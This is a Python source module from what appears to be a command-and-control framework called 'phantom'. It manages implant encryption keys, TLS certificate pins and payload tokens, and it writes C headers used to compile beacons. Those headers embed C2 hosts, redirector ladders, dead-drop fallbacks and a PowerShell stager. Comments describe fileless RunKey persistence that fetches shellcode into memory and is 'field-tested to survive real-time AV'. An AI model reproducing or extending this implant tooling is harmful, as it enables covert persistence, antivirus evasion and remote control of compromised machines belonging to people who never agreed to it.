"""Shared C2 encryption key material and authenticated encryption (AES-GCM).

Envelope keys are PER BEACON. Each identity derives its own AES-256-GCM key
from its own HMAC secret (HKDF-SHA256, see ``beacon_envelope_key``), so a
captured beacon exposes neither the deployment-wide ``PHANTOM_C2_KEY`` nor any
other beacon's traffic. The global key survives only as a fallback for
identities enrolled before this scheme and for builds with auth disabled.
"""
import hashlib
import hmac as _hmac
import os as _os
import base64
import secrets as _secrets
from typing import List, Optional
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from phantom.utils.state import get_secret, regenerate_secret

# HKDF domain separation. The salt is fixed (the IKM is already 256 bits of
# entropy) and the ``info`` string picks the purpose, so envelope secrecy and
# payload-download authorisation are independent keys from one secret.
_ENVELOPE_SALT = b"phantom-envelope-v1"
_ENVELOPE_INFO = b"phantom-envelope:"
_DOWNLOAD_INFO = b"phantom-download:"


def _aes_key() -> str:
    return get_secret("PHANTOM_C2_KEY", lambda: _secrets.token_hex(16))


def _aes_nonce_value() -> str:
    return get_secret("PHANTOM_C2_NONCE", lambda: _secrets.token_hex(6))


def _derive_to_length(raw: bytes, target_len: int) -> bytes:
    """Normalise a key value to exactly *target_len* bytes.

    - Exact length → return as-is.
    - 2× target-length hex → decode.
    - Otherwise → SHA-256 digest truncated / padded to target_len.
    """
    if len(raw) == target_len:
        return raw
    # hex-encoded?
    if len(raw) == target_len * 2 and all(c in b"0123456789abcdefABCDEF" for c in raw):
        try:
            return bytes.fromhex(raw.decode())
        except ValueError:
            pass
    # base64-encoded?  (len == ceil(target_len * 4/3) without padding)
    import base64 as _b64
    try:
        decoded = _b64.b64decode((raw + b"=" * (-len(raw) % 4)).decode("ascii"))
        if len(decoded) == target_len:
            return decoded
    except (ValueError, UnicodeDecodeError):
        pass
    # Last resort: deterministic derivation — still unique per-provided-value.
    return hashlib.sha256(raw).digest()[:target_len]


def get_aes_key() -> bytes:
    value = _aes_key()
    return _derive_to_length(value.encode(), 32)


def get_aes_nonce() -> bytes:
    value = _aes_nonce_value()
    return _derive_to_length(value.encode(), 12)


def derive_key(secret: bytes, info: bytes, length: int = 32) -> bytes:
    """HKDF-SHA256 (RFC 5869 extract + one expand block).

    Bit-identical in the three implementations that must agree on the wire:
    this module, ``c2d/envelope.go`` and ``beacon/src/crypto.h``. A drift does
    not fail loudly — it shows up as a beacon whose traffic simply never
    decrypts — so both sides pin the same vectors in their tests.
    """
    if not secret or length <= 0 or length > 32:
        return b""
    prk = _hmac.new(_ENVELOPE_SALT, bytes(secret), hashlib.sha256).digest()
    okm = _hmac.new(prk, bytes(info) + b"\x01", hashlib.sha256).digest()
    return okm[:length]


def beacon_envelope_key(secret: bytes, beacon_id: str = "") -> bytes:
    """The per-beacon AES-256-GCM key derived from that beacon's HMAC secret."""
    return derive_key(secret, _ENVELOPE_INFO + (beacon_id or "").encode("utf-8", "ignore"))


def beacon_download_token(secret: bytes, beacon_id: str = "") -> str:
    """Per-beacon payload-download token — the replacement for the global
    ``C2_PAYLOAD_TOKEN`` that used to be burned into every binary."""
    derived = derive_key(secret, _DOWNLOAD_INFO + (beacon_id or "").encode("utf-8", "ignore"))
    return derived.hex()


def _beacon_secrets(beacon_id: str) -> List[bytes]:
    if not beacon_id:
        return []
    try:
        from phantom.utils.beacon_auth import get_beacon_secrets
        return list(get_beacon_secrets(beacon_id))
    except Exception:
        return []


def get_beacon_envelope_keys(beacon_id: str) -> List[bytes]:
    """Every envelope key that identity may legitimately use right now
    (current secret, plus the previous one inside the rotation window)."""
    return [key for key in (beacon_envelope_key(secret, beacon_id)
                            for secret in _beacon_secrets(beacon_id)) if key]


def get_beacon_download_tokens(beacon_id: str) -> List[str]:
    return [beacon_download_token(secret, beacon_id)
            for secret in _beacon_secrets(beacon_id)]


def get_payload_token() -> str:
    return get_secret("PHANTOM_PAYLOAD_TOKEN", lambda: _secrets.token_urlsafe(32))


def get_api_token() -> str:
    return get_secret("PHANTOM_API_TOKEN", lambda: _secrets.token_urlsafe(32))


def regenerate_api_token() -> str:
    """Rotate the API token and return the new value."""
    return regenerate_secret("PHANTOM_API_TOKEN", lambda: _secrets.token_urlsafe(32))


def _encrypt_with_key(key: bytes, plaintext: str) -> str:
    try:
        aesgcm = AESGCM(key)
        nonce = _os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
        return base64.b64encode(nonce + ciphertext).decode()
    except Exception:
        return ""


def _decrypt_with_key(key: bytes, ciphertext_b64: str) -> str:
    try:
        raw = base64.b64decode(ciphertext_b64, validate=True)
        if len(raw) < 12 + 16:
            return ""
        nonce, ciphertext = raw[:12], raw[12:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None).decode()
    except Exception:
        return ""


def encrypt_data(plaintext: str) -> str:
    """Encrypt plaintext with AES-256-GCM using a random nonce.
    Format: base64(random_12_byte_nonce || ciphertext || 16_byte_tag).

    Uses the DEPLOYMENT key: only for traffic that is not tied to one beacon
    identity. Anything beacon-facing should use ``encrypt_for_beacon``.
    """
    return _encrypt_with_key(get_aes_key(), plaintext)


def decrypt_data(ciphertext_b64: str) -> str:
    """Decrypt base64-encoded AES-256-GCM ciphertext with prepended nonce
    (deployment key only — see ``decrypt_for_beacon``)."""
    return _decrypt_with_key(get_aes_key(), ciphertext_b64)


def _envelope_keys(beacon_id: str = "") -> List[bytes]:
    """Keys to try for one beacon, most specific first.

    The global key stays LAST on purpose: a beacon built before per-beacon
    derivation must keep checking in without a rebuild, and an identity that
    was never enrolled (auth disabled) has no per-beacon key at all.
    """
    keys = get_beacon_envelope_keys(beacon_id)
    keys.append(get_aes_key())
    return keys


def encrypt_for_beacon(plaintext: str, beacon_id: str = "") -> str:
    """Seal a response with the key THAT beacon expects."""
    for key in _envelope_keys(beacon_id):
        sealed = _encrypt_with_key(key, plaintext)
        if sealed:
            return sealed
    return ""


def decrypt_for_beacon(ciphertext_b64: str, beacon_id: str = "") -> str:
    """Open a body from one beacon, trying its per-beacon keys then the
    legacy deployment key. Returns "" when nothing authenticates."""
    for key in _envelope_keys(beacon_id):
        opened = _decrypt_with_key(key, ciphertext_b64)
        if opened:
            return opened
    return ""


def crypto_fingerprint() -> str:
    """Stable hash of current key material (for rebuild detection)."""
    material = get_aes_key() + b"|" + get_aes_nonce()
    return hashlib.sha256(material).hexdigest()


def _bytes_to_c_array(data: bytes) -> str:
    return ", ".join(f"0x{b:02x}" for b in data)


def _c2_literal(value: str) -> str:
    """A host/IP safe inside a C++ string literal and a CSV define.

    Anything carrying a quote, a backslash, a comma, whitespace or a newline
    is dropped instead of escaped: a silently mangled C2 endpoint is far
    worse than a missing fallback (the beacon would dial a host that is not
    the one the operator typed).
    """
    raw = str(value or "").strip().strip('"')
    if not raw:
        return ""
    if any(ch in raw for ch in '"\\, \t\r\n'):
        return ""
    return raw[:253]


def beacon_config_endpoint(beacon_dir: str) -> Optional[tuple]:
    """(host, port) already embedded in `c2_config.h`, or None.

    The callers used to decide "does this need a rebuild?" by comparing the
    whole rendered header against the file — which is ALWAYS different, since
    the builder adds the ladder, the proxy and the pin. The result was a
    forced full recompile on every build (minutes, and the freshness fast
    path never taken). What actually matters for a rebuild is the endpoint
    burned into the binary, so that is what gets compared.
    """
    import re
    path = _os.path.join(beacon_dir, "src", "c2_config.h")
    if not _os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as handle:
            text = handle.read()
    except OSError:
        return None
    host = re.search(r'^#define\s+C2_HOST\s+"([^"]*)"', text, re.M)
    port = re.search(r'^#define\s+C2_PORT\s+(\d+)', text, re.M)
    if not host or not port:
        return None
    return host.group(1), int(port.group(1))


def _resolve_cert_path(cert_path: str = "") -> str:
    """The C2 certificate to read a pin from, or "".

    With no explicit path the listener's own certificate is used, preferring
    the mTLS one when mTLS is configured so the pin matches what the beacon
    actually sees on the wire.
    """
    if not cert_path:
        try:
            from phantom.utils.paths import certs_dir
            from phantom.utils.state import use_mtls
            names = (["mtls_server.crt", "server.crt"] if use_mtls()
                     else ["server.crt", "mtls_server.crt"])
            for name in names:
                candidate = _os.path.join(certs_dir(), name)
                if _os.path.exists(candidate):
                    cert_path = candidate
                    break
        except Exception:
            return ""
    if not cert_path or not _os.path.exists(cert_path):
        return ""
    return cert_path


def _norm_cert_pin(value: str) -> str:
    """A SHA-256 DER digest in lowercase hex, or "" (never a malformed pin)."""
    pin = str(value or "").strip().lower()
    if len(pin) != 64 or any(c not in "0123456789abcdef" for c in pin):
        return ""
    return pin


def _norm_pubkey_pin(value: str) -> str:
    """A libcurl ``sha256//<base64>`` SPKI pin, or "" when malformed."""
    raw = str(value or "").strip()
    if not raw.startswith("sha256//"):
        return ""
    body = raw[len("sha256//"):]
    if not body:
        return ""
    import re as _re
    if not _re.fullmatch(r"[A-Za-z0-9+/=]+", body):
        return ""
    return raw


def server_cert_fingerprint(cert_path: str = "") -> str:
    """SHA-256 of the C2's DER certificate, lowercase hex — the pin value.

    Same digest the beacon computes at runtime (Windows `CryptHashCertificate`
    over `pbCertEncoded`, OpenSSL `X509_digest`): SHA-256 over DER, so a pin
    emitted here is directly comparable with what the beacon sees. Stdlib only
    (`ssl.PEM_cert_to_DER_cert`), so this works without the `cryptography`
    stack and without re-implementing PEM parsing.

    The pin covers the BACKEND's leaf. When a front / redirector sits in
    front of the C2 it must forward the RAW TLS (passthrough) so the beacon
    still sees this certificate; if the front terminates TLS with its OWN
    certificate the pinned leaf will not match and every check-in fails — in
    that topology generate the pin from the front's certificate instead and
    rotate it with the front (the C2_HOSTS ladder shares one pin).

    Returns "" when no certificate is present: the caller decides what an
    absent pin means (a build with no pin accepts ANY server certificate).
    """
    import ssl as _ssl
    cert_path = _resolve_cert_path(cert_path)
    if not cert_path:
        return ""
    try:
        with open(cert_path, "r", encoding="utf-8") as handle:
            pem = handle.read()
        der = _ssl.PEM_cert_to_DER_cert(pem)
    except Exception:
        return ""
    return hashlib.sha256(der).hexdigest()


def server_cert_pubkey_pin(cert_path: str = "") -> str:
    """libcurl-shaped pin (``sha256//<base64>``) of the certificate's SPKI.

    macOS reaches the C2 through libcurl, whose only pinning primitive
    (``CURLOPT_PINNEDPUBLICKEY``) covers the SubjectPublicKeyInfo, not the DER
    certificate. The digest covers the same public key the DER pin covers, so
    it authenticates the SAME peer — it is just the one shape that transport
    can enforce. Returns "" when no certificate (or no ``cryptography``) is
    available; the caller decides what an absent pin means.
    """
    cert_path = _resolve_cert_path(cert_path)
    if not cert_path:
        return ""
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import serialization
        with open(cert_path, "rb") as handle:
            cert = x509.load_pem_x509_certificate(handle.read())
        spki = cert.public_key().public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo)
    except Exception:
        return ""
    return "sha256//" + base64.b64encode(
        hashlib.sha256(spki).digest()).decode("ascii")


def write_beacon_c2_config(beacon_dir: str, host: str = "127.0.0.1",
                           port: int = 8080, use_ssl: bool = True,
                           ps_stager_b64: str = "",
                           hosts: Optional[List[str]] = None,
                           proxy: str = "",
                           pin: str = "",
                           pins: Optional[List[str]] = None,
                           pubkey_pin: str = "",
                           pubkey_pins: Optional[List[str]] = None,
                           dead_drop: str = "",
                           bootstrap_dead_drop: bool = True) -> str:
    """Generate c2_config.h from C2 host/port/ssl for beacon compilation.

    Also embeds the compact PowerShell stager (``C2_PS_STAGER_B64``) so the
    beacon's persistence command can install a NO-DISK RunKey: at logon the
    stager re-downloads the XOR PIC from /x and runs it in-memory, a path
    field-tested to survive real-time AV (the on-disk PE gets execution-
    blocked).    The stager is generated by ``phantom.utils.builder`` (which
    owns dropper generation) and passed in here to avoid a circular import.
    Pass ``ps_stager_b64=""`` to fall back to classic PE persist.

    The payload-download token does NOT live here: it is emitted by
    ``write_beacon_crypto_config`` (which ``crypto.h`` includes itself), so
    the code that reads it can never be compiled before it is defined.

    ``pin`` is the certificate pin for the PRIMARY endpoint and the fallback
    for any rung without its own. ``pins`` is a POSITIONAL list aligned with
    ``[host] + ladder`` giving each rung its own SHA-256 DER pin ("" = inherit
    the fallback): a ladder of independent redirectors each present their own
    certificate, so one shared pin cannot authenticate them all.
    ``pubkey_pins`` mirrors ``pins`` in libcurl's ``sha256//<base64>`` SPKI
    shape for the macOS transport, which cannot pin a DER certificate.
    """
    src_dir = _os.path.join(beacon_dir, "src")
    _os.makedirs(src_dir, exist_ok=True)
    path = _os.path.join(src_dir, "c2_config.h")
    host = _c2_literal(host) or "127.0.0.1"
    ladder = []
    for candidate in (hosts or []):
        clean = _c2_literal(candidate)
        if clean and clean != host and clean not in ladder:
            ladder.append(clean)
    proxy = _c2_literal(proxy)
    # The dead drop is a URL the beacon fetches ONLY after the whole ladder
    # failed (see phantom.utils.dead_drop). Ordinary scheme/host/path chars
    # only — anything that could close the C string literal is refused.
    dead_drop = _c2_literal(dead_drop)
    if dead_drop and not dead_drop.lower().startswith(("http://", "https://")):
        dead_drop = ""
    # A pin is a SHA-256 digest or nothing: an arbitrary string here would
    # escape the literal (or, worse, pin a peer nobody can verify).
    pin = _norm_cert_pin(pin)
    pubkey_pin = _norm_pubkey_pin(pubkey_pin)
    # ── per-endpoint pins ──────────────────────────────────────────────
    # Aligned positionally with [host] + ladder (the SAME order the beacon
    # seeds, deduped identically). Empty = "inherit the fallback pin".
    positions = [host] + ladder
    cert_pins = [_norm_cert_pin(p) for p in (pins or [])]
    spki_pins = [_norm_pubkey_pin(p) for p in (pubkey_pins or [])]
    aligned_pins = [cert_pins[i] if i < len(cert_pins) else ""
                    for i in range(len(positions))]
    aligned_spki = [spki_pins[i] if i < len(spki_pins) else ""
                    for i in range(len(positions))]
    # Trailing empties carry no information: trim so a single-pin build emits
    # no per-endpoint define at all (and stays byte-identical to before).
    while aligned_pins and not aligned_pins[-1]:
        aligned_pins.pop()
    while aligned_spki and not aligned_spki[-1]:
        aligned_spki.pop()
    # A single-endpoint build has no OTHER rung to pin: the global pin already
    # covers position 0, so per-endpoint defines would only add noise.
    if len(positions) < 2:
        aligned_pins, aligned_spki = [], []
    per_endpoint = any(aligned_pins) or any(aligned_spki)
    pins_block = ""
    if pubkey_pin:
        pins_block += (
            "// macOS/libcurl pin: the primary certificate's public key in\n"
            "// sha256//<base64> SPKI shape (libcurl cannot pin a DER cert).\n"
            f'#define BEACON_SERVER_PUBKEY_PIN "{pubkey_pin}"\n')
    if aligned_pins:
        pins_block += (
            "// PER-ENDPOINT CERTIFICATE PINS, aligned positionally with\n"
            "// [C2_HOST] + C2_HOSTS. An empty field inherits the fallback pin\n"
            "// above; a rung of the ladder that presents its OWN certificate\n"
            "// gets its own digest here instead of sharing one.\n"
            f'#define C2_HOST_PINS "{",".join(aligned_pins)}"\n')
    if aligned_spki:
        pins_block += (
            "// Same rungs in libcurl's sha256//<base64> SPKI shape, for the\n"
            "// macOS transport (it cannot pin a DER certificate).\n"
            f'#define C2_HOST_PUBKEY_PINS "{",".join(aligned_spki)}"\n')
    if per_endpoint:
        pins_block += "#define BEACON_PER_ENDPOINT_PINS 1\n"
    # Built outside the template: a nested triple quote would terminate it.
    pin_block = ""
    if pin:
        pin_block = (
            "// Pinned C2 certificate fingerprint. With a pin present the\n"
            "// beacon accepts exactly ONE peer, independently of mTLS: TLS\n"
            "// without a pin completes a handshake with ANY server (the payload\n"
            "// is still AES-GCM sealed, but the peer is unauthenticated). The\n"
            "// digest covers the DER certificate and is compared byte-for-byte\n"
            "// by the runtime verifier.\n"
            f'#define BEACON_SERVER_FINGERPRINT "{pin}"\n')
    content = f"""#pragma once
// Auto-generated by phantom.utils.c2_crypto — do not edit manually.
#define C2_HOST "{host}"
// Fallback ladder behind C2_HOST (comma-separated, may be empty). The
// beacon rotates through it after a per-endpoint failure budget, so a
// filtered address or a retired redirector does not end the engagement.
#define C2_HOSTS "{','.join(ladder)}"
#define C2_PORT {port}
#define C2_USE_HTTPS {1 if use_ssl else 0}
// Explicit proxy URL ("" = follow the endpoint's own proxy configuration).
#define C2_PROXY "{proxy}"
// LAST-RING dead drop: one neutral URL the beacon consults ONLY after every
// ladder rung failed, holding the current endpoint (XOR+base64 record, see
// phantom.utils.dead_drop). "" = no dead drop.
#define C2_DEADDROP "{dead_drop}"
// Resolve the live endpoint from the dead drop BEFORE the first check-in
// (1 = on). 0 keeps the dead drop as a last-ring-only fallback.
#define C2_DEADDROP_BOOTSTRAP {1 if bootstrap_dead_drop else 0}
// No-disk persistence stager (powershell one-liner, base64): the RunKey
// launches THIS instead of an on-disk EXE, so nothing malicious sits on
// disk. Empty = fall back to classic PE persistence.
#define C2_PS_STAGER_B64 "{ps_stager_b64}"
{"#define C2_HAS_PS_STAGER 1" if ps_stager_b64 else ""}
{pin_block}
{pins_block}
#if __has_include("beacon_auth.h")
#include "beacon_auth.h"
#endif
"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path


def _c_token_literal(value: str) -> str:
    """A token safe inside a C++ string literal (never a mangled C2 token)."""
    return str(value or "").replace('\\', "").replace('"', "").strip()


def write_beacon_crypto_config(beacon_dir: str,
                              payload_token: Optional[str] = None) -> str:
    """Generate crypto_config.h for beacon compilation.

    ``payload_token`` defaults to the DEPLOYMENT token (legacy / unenrolled
    builds). An ENROLLED build passes "": the beacon then derives its own
    download token from its per-beacon secret at runtime, so the
    deployment-wide token — which unlocks EVERY payload, forever — never lands
    in a binary that gets left on a target.

    It lives in this header rather than in ``c2_config.h`` because ``crypto.h``
    includes THIS file itself: whichever order a translation unit includes
    things in, the token is defined before the code that reads it.
    """
    src_dir = _os.path.join(beacon_dir, "src")
    _os.makedirs(src_dir, exist_ok=True)
    path = _os.path.join(src_dir, "crypto_config.h")
    key, nonce = get_aes_key(), get_aes_nonce()
    if payload_token is None:
        payload_token = get_payload_token()
    payload_token = _c_token_literal(payload_token)
    content = f"""#pragma once
// Auto-generated by phantom.utils.c2_crypto — do not edit manually.
//
// AES_KEY is the DEPLOYMENT key: only a build with NO per-beacon identity
// (auth disabled) uses it. An enrolled beacon ignores it and derives its own
// envelope key from BEACON_AUTH_SECRET at runtime (HKDF-SHA256, see
// crypto.h::envelope_key), so capturing one beacon reveals neither the
// deployment key nor another beacon's traffic.
static const unsigned char AES_KEY[]   = {{ {_bytes_to_c_array(key)} }};
static const unsigned char AES_NONCE[] = {{ {_bytes_to_c_array(nonce)} }};
// Deployment-wide payload-download token. EMPTY in an enrolled build, which
// derives a per-beacon token instead.
#define C2_PAYLOAD_TOKEN "{payload_token}"
"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path